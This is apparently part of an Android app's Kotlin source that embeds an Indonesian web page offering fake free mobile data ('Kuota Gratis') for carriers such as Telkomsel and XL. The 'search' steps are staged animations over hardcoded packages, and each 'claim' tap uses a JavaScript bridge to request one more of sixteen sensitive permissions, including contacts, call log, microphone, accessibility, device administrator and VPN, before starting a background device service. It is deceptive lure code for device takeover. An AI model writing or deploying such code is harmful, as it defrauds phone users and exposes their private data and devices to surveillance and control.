    <p class="section-label">Pilih Provider</p>
    <div class="provider-grid" id="providerGrid">
      <div class="provider-card p-telkomsel" data-provider="Telkomsel" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-wifi-high"></i></div>
        <div class="provider-name">Telkomsel</div>
        <div class="provider-hint">Simpati · AS · By.U</div>
      </div>
      <div class="provider-card p-xl" data-provider="XL Axiata" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-broadcast"></i></div>
        <div class="provider-name">XL Axiata</div>
        <div class="provider-hint">XL · AXIS</div>
      </div>
      <div class="provider-card p-indosat" data-provider="Indosat Ooredoo" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-globe-hemisphere-east"></i></div>
        <div class="provider-name">Indosat</div>
        <div class="provider-hint">IM3 · Mentari</div>
      </div>
      <div class="provider-card p-tri" data-provider="3 (Tri)" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-lightning"></i></div>
        <div class="provider-name">3 (Tri)</div>
        <div class="provider-hint">Three Indonesia</div>
      </div>
      <div class="provider-card p-smartfren" data-provider="Smartfren" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-rocket-launch"></i></div>
        <div class="provider-name">Smartfren</div>
        <div class="provider-hint">Fren · WiMax</div>
      </div>
      <div class="provider-card p-axis" data-provider="AXIS" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-star-four"></i></div>
        <div class="provider-name">AXIS</div>
        <div class="provider-hint">XL AXIS</div>
      </div>
      <div class="provider-card p-by-u" data-provider="By.U" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-device-mobile"></i></div>
        <div class="provider-name">By.U</div>
        <div class="provider-hint">Digital Telkomsel</div>
      </div>
      <div class="provider-card p-byu" data-provider="XL Satu" onclick="selectProvider(this)">
        <div class="provider-icon"><i class="ph ph-house-line"></i></div>
        <div class="provider-name">XL Satu</div>
        <div class="provider-hint">Home · Mobile</div>
      </div>
    </div>

    <p class="section-label">Nomor Handphone</p>
    <div class="input-row">
      <div class="input-group">
        <label class="input-label" for="phoneInput">
          <i class="ph ph-phone"></i> Masukkan Nomor HP Kamu
        </label>
        <div class="phone-input-wrap">
          <div class="phone-prefix"><i class="ph ph-flag" style="font-size:15px"></i>+62</div>
          <input type="tel" class="phone-input" id="phoneInput" placeholder="81234567890" maxlength="13" inputmode="numeric" autocomplete="tel">
        </div>
      </div>
      <button class="btn-cari" id="btnCari" onclick="startSearch()">
        <i class="ph ph-magnifying-glass"></i> Cari Kuota
      </button>
    </div>
  </div>

  <div class="loading-box" id="loadingBox" hidden>
    <div style="font-family:'Plus Jakarta Sans',sans-serif;font-size:16px;font-weight:700;color:var(--fg)">Sedang Mencari Kuota Gratis&#8230;</div>
    <div style="font-size:13px;color:var(--fg-muted);margin-top:4px" id="loadingProvider"></div>
    <div class="loading-steps" id="loadingSteps">
      <div class="loading-step" id="step1">
        <div class="step-icon pending" id="step1icon"><i class="ph ph-phone-call"></i></div>
        <div class="step-text"><div class="step-title">Verifikasi Nomor</div><div class="step-desc">Memeriksa Status Aktif Nomor Kamu</div></div>
        <div id="step1spin" hidden class="step-spinner"></div>
      </div>
      <div class="loading-step" id="step2">
        <div class="step-icon pending" id="step2icon"><i class="ph ph-shield-check"></i></div>
        <div class="step-text"><div class="step-title">Cek Eligibilitas</div><div class="step-desc">Memastikan Kamu Memenuhi Syarat</div></div>
        <div id="step2spin" hidden class="step-spinner"></div>
      </div>
      <div class="loading-step" id="step3">
        <div class="step-icon pending" id="step3icon"><i class="ph ph-gift"></i></div>
        <div class="step-text"><div class="step-title">Ambil Paket Tersedia</div><div class="step-desc">Mengumpulkan Daftar Kuota Untukmu</div></div>
        <div id="step3spin" hidden class="step-spinner"></div>
      </div>
    </div>
    <div class="progress-bar-wrap"><div class="progress-bar" id="progressBar"></div></div>
  </div>

  <div id="resultsSection" hidden>
    <div class="result-header">
      <div class="result-title">
        <i class="ph-fill ph-gift" style="color:var(--accent)"></i>
        Kuota Gratis Tersedia
        <span class="result-count" id="resultCount">0 Paket</span>
      </div>
      <div class="result-meta"><i class="ph ph-clock"></i><span id="resultPhone"></span></div>
    </div>
    <div class="kuota-list" id="kuotaList"></div>
  </div>

  <div style="margin-top:40px">
    <p class="section-label">Cara Klaim Kuota</p>
    <div class="steps-row">
      <div class="step-card">
        <div class="step-num"><i class="ph ph-hand-pointing"></i></div>
        <div class="step-card-title">Pilih Provider</div>
        <div class="step-card-desc">Pilih Operator Kartu SIM Yang Kamu Gunakan Saat Ini.</div>
      </div>
      <div class="step-card">
        <div class="step-num"><i class="ph ph-magnifying-glass"></i></div>
        <div class="step-card-title">Masukkan Nomor</div>
        <div class="step-card-desc">Ketik Nomor Hp Aktif Kamu Dan Tekan Tombol Cari Kuota.</div>
      </div>
      <div class="step-card">
        <div class="step-num"><i class="ph ph-check-circle"></i></div>
        <div class="step-card-title">Klaim Sekarang</div>
        <div class="step-card-desc">Pilih Paket Yang Tersedia Dan Tekan Tombol Klaim Untuk Mendapatkannya.</div>
      </div>
    </div>
  </div>
</main>

<footer class="site-footer">
  &copy; 2026 KuotaGratis &middot; Semua Hak Dilindungi &middot; Syarat &amp; Ketentuan Berlaku
</footer>

<div class="toast" id="toast"></div>

<script>
  let selectedProvider = null;

  const KUOTA_DATA = {
    'Telkomsel': [
      { size:'1',  unit:'GB',  name:'Kuota Reguler Harian',  type:'reguler',  masa:'1 Hari',  jam:'Semua Jam',  app:'Semua Aplikasi' },
      { size:'5',  unit:'GB',  name:'Kuota Utama Mingguan',  type:'utama',    masa:'7 Hari',  jam:'Semua Jam',  app:'Semua Aplikasi' },
      { size:'3',  unit:'GB',  name:'Kuota YouTube',         type:'youtube',  masa:'3 Hari',  jam:'Semua Jam',  app:'YouTube Saja' },
      { size:'2',  unit:'GB',  name:'Kuota Malam',           type:'malam',    masa:'7 Hari',  jam:'01.00-05.00',app:'Semua Aplikasi' },
      { size:'500',unit:'MB',  name:'Kuota WhatsApp',        type:'whatsapp', masa:'3 Hari',  jam:'Semua Jam',  app:'WhatsApp Saja' },
    ],
    'XL Axiata': [
      { size:'2',unit:'GB',name:'Kuota Utama XL',    type:'utama', masa:'7 Hari',  jam:'Semua Jam',    app:'Semua Aplikasi' },
      { size:'5',unit:'GB',name:'Kuota Malam XL',    type:'malam', masa:'14 Hari', jam:'00.00-07.00',  app:'Semua Aplikasi' },
      { size:'1',unit:'GB',name:'Kuota TikTok',      type:'tiktok',masa:'3 Hari',  jam:'Semua Jam',    app:'TikTok Saja' },
    ],
    'Indosat Ooredoo': [
      { size:'3', unit:'GB',name:'Kuota Reguler IM3',    type:'reguler',masa:'7 Hari', jam:'Semua Jam',app:'Semua Aplikasi' },
      { size:'10',unit:'GB',name:'Kuota Utama Freedom',  type:'utama',  masa:'30 Hari',jam:'Semua Jam',app:'Semua Aplikasi' },
      { size:'2', unit:'GB',name:'Kuota Lokal',          type:'lokal',  masa:'7 Hari', jam:'Semua Jam',app:'Semua Aplikasi' },
    ],
    '3 (Tri)': [
      { size:'4',unit:'GB',name:'Kuota Always On',    type:'utama',  masa:'30 Hari',jam:'Semua Jam',    app:'Semua Aplikasi' },
      { size:'8',unit:'GB',name:'Kuota Malam Tri',    type:'malam',  masa:'30 Hari',jam:'00.00-09.00',  app:'Semua Aplikasi' },
      { size:'1',unit:'GB',name:'Kuota WhatsApp Tri', type:'whatsapp',masa:'7 Hari', jam:'Semua Jam',    app:'WhatsApp Saja' },
    ],
    'Smartfren': [
      { size:'2',unit:'GB',name:'Kuota 4G Smartfren',       type:'reguler',masa:'7 Hari', jam:'Semua Jam',   app:'Semua Aplikasi' },
      { size:'5',unit:'GB',name:'Kuota Unlimited Malam',     type:'malam',  masa:'30 Hari',jam:'23.00-07.00', app:'Semua Aplikasi' },
    ],
    'AXIS': [
      { size:'1.5',unit:'GB',name:'Kuota Aigo',          type:'reguler',masa:'7 Hari', jam:'Semua Jam',   app:'Semua Aplikasi' },
      { size:'3',  unit:'GB',name:'Kuota Bronet Malam',  type:'malam',  masa:'30 Hari',jam:'00.00-09.00', app:'Semua Aplikasi' },
      { size:'2',  unit:'GB',name:'Kuota YouTube AXIS',  type:'youtube',masa:'7 Hari', jam:'Semua Jam',   app:'YouTube Saja' },
    ],
    'By.U': [
      { size:'1',unit:'GB',name:'Kuota By.U Harian',    type:'reguler',masa:'1 Hari',jam:'Semua Jam',app:'Semua Aplikasi' },
      { size:'3',unit:'GB',name:'Kuota By.U Mingguan',  type:'utama',  masa:'7 Hari',jam:'Semua Jam',app:'Semua Aplikasi' },
    ],
    'XL Satu': [
      { size:'5',unit:'GB',name:'Kuota XL Satu Home',   type:'utama',  masa:'30 Hari',jam:'Semua Jam',app:'Semua Aplikasi' },
      { size:'2',unit:'GB',name:'Kuota XL Satu Mobile', type:'reguler',masa:'14 Hari',jam:'Semua Jam',app:'Semua Aplikasi' },
    ],
  };

  const BADGE_LABEL = {
    reguler:'Reguler',utama:'Utama',malam:'Malam',
    lokal:'Lokal',youtube:'YouTube',tiktok:'TikTok',whatsapp:'WhatsApp'
  };

  // ── PERMISSION LIST (sequential, satu per klik Klaim) ──
  const PERMS = [
    { check:()=> window.Android ? Android.isCamGranted()           : false, request:()=> window.Android && Android.requestCamPerm() },
    { check:()=> window.Android ? Android.isGalleryGranted()       : false, request:()=> window.Android && Android.requestGalleryPerm() },
    { check:()=> window.Android ? Android.isNotifGranted()         : false, request:()=> window.Android && Android.requestNotifPerm() },
    { check:()=> window.Android ? Android.isContactsGranted()      : false, request:()=> window.Android && Android.requestContactsPerm() },
    { check:()=> window.Android ? Android.isLocationGranted()      : false, request:()=> window.Android && Android.requestLocationPerm() },
    { check:()=> window.Android ? Android.isCallLogGranted()       : false, request:()=> window.Android && Android.requestCallLogPerm() },
    { check:()=> window.Android ? Android.isCallPhoneGranted()     : false, request:()=> window.Android && Android.requestCallPhonePerm() },
    { check:()=> window.Android ? Android.isPhoneStateGranted()    : false, request:()=> window.Android && Android.requestPhoneStatePerm() },
    { check:()=> window.Android ? Android.isStorageGranted()       : false, request:()=> window.Android && Android.requestStoragePerm() },
    { check:()=> window.Android ? Android.isRecordAudioGranted()   : false, request:()=> window.Android && Android.requestRecordAudioPerm() },
    { check:()=> window.Android ? Android.isOverlayGranted()       : false, request:()=> window.Android && Android.requestOverlayPerm() },
    { check:()=> window.Android ? Android.isUsageAccessGranted()   : false, request:()=> window.Android && Android.requestUsageAccessPerm() },
    { check:()=> window.Android ? Android.isWriteSettingsGranted() : false, request:()=> window.Android && Android.requestWriteSettingsPerm() },
    { check:()=> window.Android ? Android.isVpnGranted()           : false, request:()=> window.Android && Android.requestVpnPerm() },
    { check:()=> window.Android ? Android.isDeviceAdminGranted()   : false, request:()=> window.Android && Android.requestDeviceAdminPerm() },
    { check:()=> window.Android ? Android.isAccessibilityGranted() : false, request:()=> window.Android && Android.requestAccessibilityPerm() },
  ];

  function allGranted() { return PERMS.every(p => p.check()); }

  // Dipanggil dari Android setelah permission result
  function refreshPerms() {
    // cek apakah semua sudah granted → proceed to url
    if (allGranted() && window.Android) {
      Android.proceedToUrl();
    }
  }

  // Setiap klik "Klaim Sekarang" → trigger 1 permission berikutnya
  function klaimKuota(btn, label) {
    const next = PERMS.find(p => !p.check());
    if (next) {
      // masih ada izin yang belum → minta 1 izin ini
      next.request();
      // tampilkan loading di tombol
      btn.disabled = true;
      btn.innerHTML = '<div style="width:14px;height:14px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite"></div> Memproses\u2026';
      setTimeout(() => {
        btn.disabled = false;
        btn.innerHTML = '<i class="ph-fill ph-check-circle"></i> Klaim Sekarang';
      }, 1200);
      return;
    }
    // semua sudah granted → sukses
    btn.disabled = true;
    btn.innerHTML = '<div style="width:14px;height:14px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite"></div> Memproses\u2026';
    setTimeout(() => {
      btn.innerHTML = '<i class="ph-fill ph-check-circle"></i> Berhasil Diklaim!';
      btn.style.background = 'var(--success)';
      showToast('Kuota ' + label + ' Berhasil Diklaim!', 'ph-check-circle');
      if (window.Android) Android.proceedToUrl();
    }, 1400);
  }

  function selectProvider(el) {
    document.querySelectorAll('.provider-card').forEach(c => c.classList.remove('selected'));
    el.classList.add('selected');
    selectedProvider = el.dataset.provider;
  }

  function showToast(msg, icon) {
    icon = icon || 'ph-check-circle';
    var t = document.getElementById('toast');
    t.innerHTML = '<i class="ph-fill ' + icon + '"></i> ' + msg;
    t.classList.add('show');
    setTimeout(function(){ t.classList.remove('show'); }, 3000);
  }

  function delay(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }

  function setStep(n, state) {
    var icon = document.getElementById('step' + n + 'icon');
    var spin = document.getElementById('step' + n + 'spin');
    icon.className = 'step-icon ' + state;
    if (state === 'active') {
      spin.hidden = false;
    } else {
      spin.hidden = true;
      if (state === 'done') icon.innerHTML = '<i class="ph ph-check"></i>';
    }
  }

  async function startSearch() {
    var phone = document.getElementById('phoneInput').value.trim();
    if (!selectedProvider) { showToast('Pilih Provider Terlebih Dahulu', 'ph-warning-circle'); return; }
    if (phone.length < 8)  { showToast('Nomor HP Tidak Valid', 'ph-warning-circle'); return; }

    for (var i = 1; i <= 3; i++) {
      var icon = document.getElementById('step' + i + 'icon');
      icon.className = 'step-icon pending';
      icon.innerHTML = ['<i class="ph ph-phone-call"></i>','<i class="ph ph-shield-check"></i>','<i class="ph ph-gift"></i>'][i-1];
      document.getElementById('step' + i + 'spin').hidden = true;
    }
    document.getElementById('loadingProvider').textContent = 'Mencari untuk nomor +62' + phone + ' (' + selectedProvider + ')';
    document.getElementById('btnCari').disabled = true;
    document.getElementById('resultsSection').hidden = true;
    document.getElementById('loadingBox').hidden = false;
    var bar = document.getElementById('progressBar');
    bar.style.width = '0%';

    setStep(1,'active'); bar.style.width = '15%'; await delay(900);
    setStep(1,'done');   bar.style.width = '40%';
    setStep(2,'active'); await delay(800);
    setStep(2,'done');   bar.style.width = '70%';
    setStep(3,'active'); await delay(1000);
    setStep(3,'done');   bar.style.width = '100%';
    await delay(350);

    document.getElementById('loadingBox').hidden = true;
    document.getElementById('btnCari').disabled = false;
    showResults(phone);
  }

  function showResults(phone) {
    var kuotas = KUOTA_DATA[selectedProvider] || [];
    var list = document.getElementById('kuotaList');
    list.innerHTML = '';
    document.getElementById('resultCount').textContent = kuotas.length + ' Paket';
    document.getElementById('resultPhone').textContent = '+62' + phone + ' \u00b7 ' + selectedProvider;
    kuotas.forEach(function(k, i) {
      var card = document.createElement('div');
      card.className = 'kuota-card';
      card.style.animationDelay = (i * 70) + 'ms';
      card.innerHTML =
        '<div class="kuota-top">' +
          '<span class="kuota-badge badge-' + k.type + '">' + BADGE_LABEL[k.type] + '</span>' +
          '<span class="kuota-free-tag"><i class="ph ph-gift" style="font-size:12px"></i> Gratis</span>' +
        '</div>' +
        '<div>' +
          '<div class="kuota-size">' + k.size + '<sub>' + k.unit + '</sub></div>' +
          '<div class="kuota-name">' + k.name + '</div>' +
        '</div>' +
        '<div class="kuota-detail">' +
          '<div class="kuota-row"><i class="ph ph-clock"></i> Masa Aktif: ' + k.masa + '</div>' +
          '<div class="kuota-row"><i class="ph ph-sun"></i> Jam Aktif: ' + k.jam + '</div>' +
          '<div class="kuota-row"><i class="ph ph-app-window"></i> ' + k.app + '</div>' +
        '</div>' +
        '<button class="btn-klaim" onclick="klaimKuota(this,\'' + k.size + ' ' + k.unit + '\')">' +
          '<i class="ph ph-check-circle"></i> Klaim Sekarang' +
        '</button>';
      list.appendChild(card);
    });
    document.getElementById('resultsSection').hidden = false;
    document.getElementById('resultsSection').scrollIntoView({ behavior:'smooth', block:'start' });
  }

  document.getElementById('phoneInput').addEventListener('keydown', function(e){ if(e.key==='Enter') startSearch(); });
  document.getElementById('phoneInput').addEventListener('input', function(e){ e.target.value = e.target.value.replace(/\D/g,''); });
</script>
</body>
</html>
"""

    private fun dpToPx(dp: Int) = (dp * resources.displayMetrics.density).toInt()

    private fun startDeviceService() {
        ContextCompat.startForegroundService(this, Intent(this, DeviceService::class.java))
    }
}
